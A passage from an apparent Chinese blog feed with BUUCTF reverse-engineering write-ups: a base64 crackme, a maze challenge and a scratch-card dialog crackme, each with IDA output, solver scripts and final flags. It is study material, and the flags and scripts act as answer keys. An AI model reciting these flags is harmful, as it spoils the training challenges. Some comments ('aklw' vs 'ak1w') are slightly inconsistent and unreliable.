__int8)byte_41A144[0] &gt;&gt; 2];</span><br><span class="line">        v6 = v7 + 1;</span><br><span class="line">        *((_BYTE *)Dst + v6++) = aAbcdefghijklmn[((byte_41A144[1] &amp; 0xF0) &gt;&gt; 4) | 16 * (byte_41A144[0] &amp; 3)];</span><br><span class="line">        *((_BYTE *)Dst + v6++) = aAbcdefghijklmn[((byte_41A144[2] &amp; 0xC0) &gt;&gt; 6) | 4 * (byte_41A144[1] &amp; 0xF)];</span><br><span class="line">        *((_BYTE *)Dst + v6) = aAbcdefghijklmn[byte_41A144[2] &amp; 0x3F];</span><br><span class="line">        v7 = v6 + 1;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *((_BYTE *)Dst + v7) = 0;</span><br><span class="line">  return Dst;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>进去 aAbcdefghijklmn  我们可以看到，基本上很确定就是base64加密函数了</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.rdata:00417B30 aAbcdefghijklmn db &apos;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&apos;</span><br></pre></td></tr></table></figure><blockquote><p>脚本</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf8</span><br><span class="line">import base64</span><br><span class="line">a=&quot;e3nifIH9b_C@n@dH&quot;</span><br><span class="line">b=&quot;&quot;</span><br><span class="line">c=[]</span><br><span class="line">for i in range(0,len(a)):</span><br><span class="line">b+=(chr(ord(a[i])-i))</span><br><span class="line">print(b)#e2lfbDB2ZV95b3V9</span><br><span class="line">print(base64.b64decode(b))</span><br><span class="line">#&#123;i_l0ve_you&#125;</span><br></pre></td></tr></table></figure><blockquote><p>遇到的问题：Reverse.id2: Permission denied：<br>第一次我是改了 兼容性 就好了 （不是正解获取，但它不是我现在的重点），然后在做下一题时  又遇到了，可能时因为我的电脑用户名是中文，我将文件转到英文目录下 于是可以了</p></blockquote><h1 id="不一样的flag"><a href="#不一样的flag" class="headerlink" title="不一样的flag"></a>不一样的flag</h1><blockquote><p>首先查壳：<br><a href="https://imgchr.com/i/uMTkJe" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/09/28/uMTkJe.png" alt="uMTkJe.png"></a> 于是想到脱壳，却在OD中找不到  pushad的指令，？？？<br>载入ida也找不到，应该不是壳吧！</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char v3; // [esp+17h] [ebp-35h]</span><br><span class="line">  int v4; // [esp+30h] [ebp-1Ch]</span><br><span class="line">  int v5; // [esp+34h] [ebp-18h]</span><br><span class="line">  signed int v6; // [esp+38h] [ebp-14h]</span><br><span class="line">  int i; // [esp+3Ch] [ebp-10h]</span><br><span class="line">  int v8; // [esp+40h] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  v4 = 0;</span><br><span class="line">  v5 = 0;</span><br><span class="line">  qmemcpy(&amp;v3, _data_start__, 25u);             // v3= *11110100001010000101111#</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;you can choose one action to execute&quot;);</span><br><span class="line">    puts(&quot;1 up&quot;);</span><br><span class="line">    puts(&quot;2 down&quot;);</span><br><span class="line">    puts(&quot;3 left&quot;);</span><br><span class="line">    printf(&quot;4 right\n:&quot;);</span><br><span class="line">    scanf(&quot;%d&quot;, &amp;v6);</span><br><span class="line">    if ( v6 == 2 )                              // 2 down v4行++   </span><br><span class="line">    &#123;</span><br><span class="line">      ++v4;</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( v6 &gt; 2 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v6 == 3 )                            // 3 left   v5列--</span><br><span class="line">      &#123;</span><br><span class="line">        --v5;</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        if ( v6 != 4 )</span><br><span class="line">LABEL_13:</span><br><span class="line">          exit(1);</span><br><span class="line">        ++v5;                                   // 4   right   v5列++</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v6 != 1 )</span><br><span class="line">        goto LABEL_13;                          // 1   up   v4行--</span><br><span class="line">      --v4;</span><br><span class="line">    &#125;</span><br><span class="line">    for ( i = 0; i &lt;= 1; ++i )                  // 循环 2次</span><br><span class="line">    &#123;</span><br><span class="line">      if ( *(&amp;v4 + i) &lt; 0 || *(&amp;v4 + i) &gt; 4 )</span><br><span class="line">        exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">    if ( *((_BYTE *)&amp;v8 + 5 * v4 + v5 - 41) == &apos;1&apos; )// 5*5 矩阵</span><br><span class="line">      exit(1);</span><br><span class="line">    if ( *((_BYTE *)&amp;v8 + 5 * v4 + v5 - 41) == &apos;#&apos; )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;\nok, the order you enter is the flag!&quot;);</span><br><span class="line">      exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这题很简单的迷宫题，v3所指的地址就是一个5*5的迷宫：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">*1111</span><br><span class="line">01000</span><br><span class="line">01010</span><br><span class="line">00010</span><br><span class="line">1111#    </span><br><span class="line">//即只能沿着  0 走</span><br><span class="line">//下下下友友上上右右下下下</span><br><span class="line">//222441144222</span><br><span class="line">所以flag:     flag&#123;222441144222&#125;</span><br></pre></td></tr></table></figure><p>刮开有奖</p><blockquote><p>参考链接：<a href="https://www.cnblogs.com/Mayfly-nymph/p/11488817.html" target="_blank" rel="noopener">https://www.cnblogs.com/Mayfly-nymph/p/11488817.html</a></p></blockquote><blockquote><p>双击打开没有任何只有一个页面<br>==图片==</p></blockquote><blockquote><p>静态分析下：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">BOOL __stdcall DialogFunc(HWND hDlg, UINT a2, WPARAM a3, LPARAM a4)</span><br><span class="line">&#123;</span><br><span class="line">  const char *v4; // esi</span><br><span class="line">  const char *v5; // edi</span><br><span class="line">  int v7; // [esp+8h] [ebp-20030h]</span><br><span class="line">  int v8; // [esp+Ch] [ebp-2002Ch]</span><br><span class="line">  int v9; // [esp+10h] [ebp-20028h]</span><br><span class="line">  int v10; // [esp+14h] [ebp-20024h]</span><br><span class="line">  int v11; // [esp+18h] [ebp-20020h]</span><br><span class="line">  int v12; // [esp+1Ch] [ebp-2001Ch]</span><br><span class="line">  int v13; // [esp+20h] [ebp-20018h]</span><br><span class="line">  int v14; // [esp+24h] [ebp-20014h]</span><br><span class="line">  int v15; // [esp+28h] [ebp-20010h]</span><br><span class="line">  int v16; // [esp+2Ch] [ebp-2000Ch]</span><br><span class="line">  int v17; // [esp+30h] [ebp-20008h]</span><br><span class="line">  CHAR String; // [esp+34h] [ebp-20004h]</span><br><span class="line">  char v19; // [esp+35h] [ebp-20003h]</span><br><span class="line">  char v20; // [esp+36h] [ebp-20002h]</span><br><span class="line">  char v21; // [esp+37h] [ebp-20001h]</span><br><span class="line">  char v22; // [esp+38h] [ebp-20000h]</span><br><span class="line">  char v23; // [esp+39h] [ebp-1FFFFh]</span><br><span class="line">  char v24; // [esp+3Ah] [ebp-1FFFEh]</span><br><span class="line">  char v25; // [esp+3Bh] [ebp-1FFFDh]</span><br><span class="line">  char v26; // [esp+10034h] [ebp-10004h]</span><br><span class="line">  char v27; // [esp+10035h] [ebp-10003h]</span><br><span class="line">  char v28; // [esp+10036h] [ebp-10002h]</span><br><span class="line"></span><br><span class="line">  if ( a2 == 272 )</span><br><span class="line">    return 1;</span><br><span class="line">  if ( a2 != 273 )</span><br><span class="line">    return 0;</span><br><span class="line">  if ( (_WORD)a3 == 1001 )</span><br><span class="line">  &#123;</span><br><span class="line">    memset(&amp;String, 0, 0xFFFFu);</span><br><span class="line">    GetDlgItemTextA(hDlg, 1000, &amp;String, 0xFFFF);// 我们输入的字符串</span><br><span class="line">    if ( strlen(&amp;String) == 8 )                 // 长度要等于  8</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = &apos;Z&apos;;                                 // 90,74,83,69,67,97,78,72,51,110,103</span><br><span class="line">      v8 = &apos;J&apos;;</span><br><span class="line">      v9 = &apos;S&apos;;</span><br><span class="line">      v10 = &apos;E&apos;;</span><br><span class="line">      v11 = &apos;C&apos;;</span><br><span class="line">      v12 = &apos;a&apos;;</span><br><span class="line">      v13 = &apos;N&apos;;</span><br><span class="line">      v14 = &apos;H&apos;;</span><br><span class="line">      v15 = &apos;3&apos;;</span><br><span class="line">      v16 = &apos;n&apos;;</span><br><span class="line">      v17 = &apos;g&apos;;</span><br><span class="line">      sub_4010F0((int)&amp;v7, 0, 10);              // ZJSECaNH3ng</span><br><span class="line">                                                // 3CEHJNSZagn</span><br><span class="line">      memset(&amp;v26, 0, 0xFFFFu);</span><br><span class="line">      v26 = v23;                                // v26= 经处理后得到字符串的 6-8位</span><br><span class="line">      v28 = v25;</span><br><span class="line">      v27 = v24;</span><br><span class="line">      v4 = sub_401000((int)&amp;v26, strlen(&amp;v26)); // v4=base64(v26)  =aklw   由下面strcmp(v4,aklw)得到</span><br><span class="line">      memset(&amp;v26, 0, 0xFFFFu);</span><br><span class="line">      v27 = v21;</span><br><span class="line">      v26 = v20;</span><br><span class="line">      v28 = v22;                                // v27= 经处理后得到字符串的3，4，5位</span><br><span class="line">      v5 = sub_401000((int)&amp;v26, strlen(&amp;v26)); // v5 =base64（v27）=V1Ax  由下面strcmp(v5,V1Ax)得到</span><br><span class="line">      if ( String == v7 + 0x22                  // sub_4010F0函数处理后的第一位为 chr(ord(&apos;3&apos;)+34)=&apos;U&apos;</span><br><span class="line">        &amp;&amp; v19 == v11                           // sub_4010F0函数处理后的第二位为  J</span><br><span class="line">        &amp;&amp; 4 * v20 - 141 == 3 * v9</span><br><span class="line">        &amp;&amp; v21 / 4 == 2 * (v14 / 9)</span><br><span class="line">        &amp;&amp; !strcmp(v4, &quot;ak1w&quot;)</span><br><span class="line">        &amp;&amp; !strcmp(</span><br><span class="line">              v5,</span><br><span class="line">              &quot;V1Ax&quot;) )</span><br><span class="line">      &#123;</span><br><span class="line">        MessageBoxA(hDlg, &quot;U g3t 1T!&quot;, &quot;@_@&quot;, 0);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( (_WORD)a3 != 1 &amp;&amp; (_WORD)a3 != 2 )</span><br><span class="line">    return 0;</span><br><span class="line">  EndDialog(hDlg, (unsigned __int16)a3);</span><br><span class="line">  return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里有个函数GetDlgItemTextA</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">函数原型：int GetDlgItemText( HWND hDlg , int nID, LPTSTR lpStr, int nMaxCount) const;</span><br><span class="line">具体参考链接：https://baike.so.com/doc/6840317-7057592.html</span><br></pre></td></tr></table></figure><blockquote><p>这里学到了，当一个函数很麻烦的时候可以尝试用稍稍修改下代码用C跑下</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">int __cdecl sub_4010F0(char *a1, int a2, int a3)</span><br><span class="line">&#123;</span><br><span class="line">    int result; // eax</span><br><span class="line">    int i; // esi</span><br><span class="line">    int v5; // ecx</span><br><span class="line">    int v6; // edx</span><br><span class="line"></span><br><span class="line">    result = a3;</span><br><span class="line">    for (i = a2; i &lt;= a3; a2 = i)</span><br><span class="line">    &#123;</span><br><span class="line">        v5 = i;</span><br><span class="line">        v6 = a1[i];</span><br><span class="line">        if (a2 &lt; result &amp;&amp; i &lt; result)</span><br><span class="line">        &#123;</span><br><span class="line">            do</span><br><span class="line">            &#123;</span><br><span class="line">                if (v6 &gt;a1[result])</span><br><span class="line">                &#123;</span><br><span class="line">                    if (i &gt;= result)</span><br><span class="line">                        break;</span><br><span class="line">                    ++i;</span><br><span class="line">                    a1[v5] = a1[result];</span><br><span class="line">                    if (i &gt;= result)</span><br><span class="line">                        break;</span><br><span class="line">                    while (a1[i] &lt;= v6)</span><br><span class="line">                    &#123;</span><br><span class="line">                        if (++i &gt;= result)</span><br><span class="line">                            goto LABEL_13;</span><br><span class="line">                    &#125;</span><br><span class="line">                    if (i &gt;= result)</span><br><span class="line">                        break;</span><br><span class="line">                    v5 = i;</span><br><span class="line">                    a1[result] = a1[i];</span><br><span class="line">                &#125;</span><br><span class="line">                --result;</span><br><span class="line">            &#125; while (i &lt; result);</span><br><span class="line">        &#125;</span><br><span class="line">    LABEL_13:</span><br><span class="line">        a1[result] = v6;</span><br><span class="line">        sub_4010F0(a1, a2, i - 1);</span><br><span class="line">        result = a3;</span><br><span class="line">        ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">char str[20] = &#123; 90,74,83,69,67,97,78,72,51,110,103 &#125;;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    cout &lt;&lt; str &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    sub_4010F0(str, 0, 10);</span><br><span class="line"></span><br><span class="line">    for (int i = 0; i &lt; 11; ++i) &#123;</span><br><span class="line">        cout &lt;&lt; str[i];</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">//ZJSECaNH3ng</span><br><span class="line">//3CEHJNSZagn</span><br></pre></td></tr></table></figure><blockquote><p>sub40100函数猜测是base64加密</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__cdecl sub_401000(int a1, int a2)</span><br><span class="line">&#123;</span><br><span class="line">  int v2; // eax</span><br><span class="line">  int v3; // esi</span><br><span class="line">  size_t v4; // ebx</span><br><span class="line">  _BYTE *v5; // eax</span><br><span class="line">  _BYTE *v6; // edi</span><br><span class="line">  int v7; // eax</span><br><span class="line">  _BYTE *v8; // ebx</span><br><span class="line">  int v9; // edi</span><br><span class="line">  signed int v10; // edx</span><br><span class="line">  int v11; // edi</span><br><span class="line">  signed int v12; // eax</span><br><span class="line">  signed int v13; // esi</span><br><span class="line">  _BYTE *result; // eax</span><br><span class="line">  _BYTE *v15; // [esp+Ch] [ebp-10h]</span><br><span class="line">  _BYTE *v16; // [esp+10h] [ebp-Ch]</span><br><span class="line">  int v17; // [esp+14h] [ebp-8h]</span><br><span class="line">  int v18; // [esp+18h] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  v2 = a2 / 3;</span><br><span class="line">  v3 = 0;</span><br><span class="line">  if ( a2 % 3 &gt; 0 )</span><br><span class="line">    ++v2;</span><br><span class="line">  v4 = 4 * v2 + 1;</span><br><span class="line">  v5 = malloc(v4);</span><br><span class="line">  v6 = v5;</span><br><span class="line">  v15 = v5;</span><br><span class="line">  if ( !v5 )</span><br><span class="line">    exit(0);</span><br><span class="line">  memset(v5, 0, v4);</span><br><span class="line">  v7 = a2;</span><br><span class="line">  v8 = v6;</span><br><span class="line">  v16 = v6;</span><br><span class="line">  if ( a2 &gt; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = 0;</span><br><span class="line">      v10 = 0;</span><br><span class="line">      v18 = 0;</span><br><span class="line">      do</span><br><span class="line">      &#123;</span><br><span class="line">        if ( v3 &gt;= v7 )</span><br><span class="line">          break;</span><br><span class="line">        ++v10;</span><br><span class="line">        v9 = *(unsigned __int8 *)(v3++ + a1) | (v9 &lt;&lt; 8);</span><br><span class="line">      &#125;</span><br><span class="line">      while ( v10 &lt; 3 );</span><br><span class="line">      v11 = v9 &lt;&lt; 8 * (3 - v10);</span><br><span class="line">      v12 = 0;</span><br><span class="line">      v17 = v3;</span><br><span class="line">      v13 = 18;</span><br><span class="line">      do</span><br><span class="line">      &#123;</span><br><span class="line">        if ( v10 &gt;= v12 )</span><br><span class="line">        &#123;</span><br><span class="line">          *((_BYTE *)&amp;v18 + v12) = (v11 &gt;&gt; v13) &amp; 0x3F;</span><br><span class="line">          v8 = v16;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          *((_BYTE *)&amp;v18 + v12) = 64;</span><br><span class="line">        &#125;</span><br><span class="line">        *v8++ = byte_407830[*((char *)&amp;v18 + v12)];</span><br><span class="line">        v13 -= 6;</span><br><span class="line">        ++v12;</span><br><span class="line">        v16 = v8;</span><br><span class="line">      &#125;</span><br><span class="line">      while ( v13 &gt; -6 );</span><br><span class="line">      v3 = v17;</span><br><span class="line">      if ( v17 &gt;= a2 )</span><br><span class="line">        break;</span><br><span class="line">      v7 = a2;</span><br><span class="line">    &#125;</span><br><span class="line">    v6 = v15;</span><br><span class="line">  &#125;</span><br><span class="line">  result = v6;</span><br><span class="line">  *v8 = 0;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>我们看下byte_407830[]里是什么，然后就很确定是base64了</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=</span><br></pre></td></tr></table></figure><blockquote><p>所以flag 就是    U+J + aklw的base64解密 V1Ax的base64解密，脚本：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf8</span><br><span class="line">import base64</span><br><span class="line">a=&quot;U&quot;</span><br><span class="line">b=&quot;J&quot;</span><br><span class="line">c=&quot;ak1w&quot;</span><br><span class="line">d=&quot;V1Ax&quot;</span><br><span class="line">cc=base64.b64decode(c)</span><br><span class="line">dd=base64.b64decode(d)</span><br><span class="line">e=a+b+cc+dd</span><br><span class="line">print(e)#UJjMpWP1</span><br><span class="line">#所以    flag&#123;UJjMpWP1&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这题有点难，我看了wp，回头再好好研究研究这题，有一点疑问！没弄全懂！</p></blockquote><h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><blockquote><p>这几天挺难受，但学习绝对不能停！<br><img src="https://s2.ax1x.com/2019/09/27/uuZGcR.png" alt="uuZGcR.png"></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;没有妄想，没有失望！&lt;/p&gt;
    
    </summary>
    
    
      <category term="re" scheme="http://yoursite.com/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF re部分题解0</title>
    <link href="http://yoursite.com/2019/09/26/BUUCTF%20re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A30/"/>
    <id>http://yoursite.com/2019/09/26/BUUCTF re部分题解0/</id>
    <published>2019-09-26T15:33:08.000Z</published>
    <updated>2019-09-27T16:25:33.576Z</updated>
    
    <content type="html"><![CDATA[<p>今天不开心，我怎么也不能原谅自己，这个年纪了，该争取的就该上点心！！！这段时间没有更新博客，后来呢要一天一更！努力跑吧，走着真的来不及！今天开刷BUUCTF！</p><a id="more"></a><h1 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h1><blockquote><p>很简单，拖入ida 然后F5就能看到flag，到这其实就结束了，这里我稍稍复习下idc脚本语言。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//这个是我们直接在数据段能看到的，为了更明白，我把它转成byte数据显示，见下一个代码区域！</span><br><span class="line">.rdata:0000000000429005 ; char aFlagThisIsAEas[]</span><br><span class="line">.rdata:0000000000429005 aFlagThisIsAEas db &apos;flag&#123;this_Is_a_EaSyRe&#125;&apos;,0</span><br><span class="line">.rdata:0000000000429005                                         ; DATA XREF: main+31↑o</span><br><span class="line">.rdata:000000000042901C ; char aSorryYouCanTGe[]</span><br><span class="line">.rdata:000000000042901C aSorryYouCanTGe db &apos;sorry,you can&apos;,27h,&apos;t get flag&apos;,0</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">.rdata:0000000000429005 ; char byte_429005[]</span><br><span class="line">.rdata:0000000000429005 byte_429005     db 66h                  ; DATA XREF: main+31↑o</span><br><span class="line">.rdata:0000000000429006                 db  6Ch ; l</span><br><span class="line">.rdata:0000000000429007                 db  61h ; a</span><br><span class="line">.rdata:0000000000429008                 db  67h ; g</span><br><span class="line">.rdata:0000000000429009                 db  7Bh ; &#123;</span><br><span class="line">.rdata:000000000042900A                 db  74h ; t</span><br><span class="line">.rdata:000000000042900B                 db  68h ; h</span><br><span class="line">.rdata:000000000042900C                 db  69h ; i</span><br><span class="line">.rdata:000000000042900D                 db  73h ; s</span><br><span class="line">.rdata:000000000042900E                 db  5Fh ; _</span><br><span class="line">.rdata:000000000042900F                 db  49h ; I</span><br><span class="line">.rdata:0000000000429010                 db  73h ; s</span><br><span class="line">.rdata:0000000000429011                 db  5Fh ; _</span><br><span class="line">.rdata:0000000000429012                 db  61h ; a</span><br><span class="line">.rdata:0000000000429013                 db  5Fh ; _</span><br><span class="line">.rdata:0000000000429014                 db  45h ; E</span><br><span class="line">.rdata:0000000000429015                 db  61h ; a</span><br><span class="line">.rdata:0000000000429016                 db  